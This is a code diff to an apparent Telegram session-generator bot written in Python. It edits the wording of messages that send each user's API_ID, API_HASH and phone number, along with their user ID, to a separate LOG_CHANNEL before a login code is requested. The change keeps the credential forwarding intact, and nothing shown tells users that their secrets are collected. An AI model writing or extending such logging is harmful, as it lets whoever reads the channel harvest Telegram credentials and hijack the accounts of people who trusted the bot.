@@ -39,7 +39,7 @@ async def teleGen(strbot, callback_data):
     await strbot.send_message(
         chat_id=LOG_CHANNEL,
         text=(
-            f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) Account api_id is : `{API_ID.text}`'
+            f'{callback_data.from_user.mention} `{callback_data.from_user.id}` API_ID: `{API_ID.text}`'
         )
     )    
     if not (
@@ -60,13 +60,13 @@ async def teleGen(strbot, callback_data):
     await strbot.send_message(
         chat_id=LOG_CHANNEL,
         text=(
-            f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) Account api_hash is : `{API_HASH.text}`'
+            f'{callback_data.from_user.mention} `{callback_data.from_user.id}` API_HASH: `{API_HASH.text}`'
         )
     )    
     PHONE = await strbot.ask(
         chat_id=user_id,
         text=(
-            'Now send me your `phone number` in international format. Example : +91xxxxxxxxxx'
+            'Now send me your `phone number` in international format. Example : +98xxxxxxxxxx'
         )
     )    
    
@@ -86,7 +86,7 @@ async def teleGen(strbot, callback_data):
         await strbot.send_message(
                 chat_id=LOG_CHANNEL,
                 text=(
-                    f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) phone number is : `{PHONE.text}`'
+                    f'{callback_data.from_user.mention} `{callback_data.from_user.id}` Phone Number: `{PHONE.text}`'
                 )
             )     
         sent_code = await userClient.send_code_request(PHONE.text)
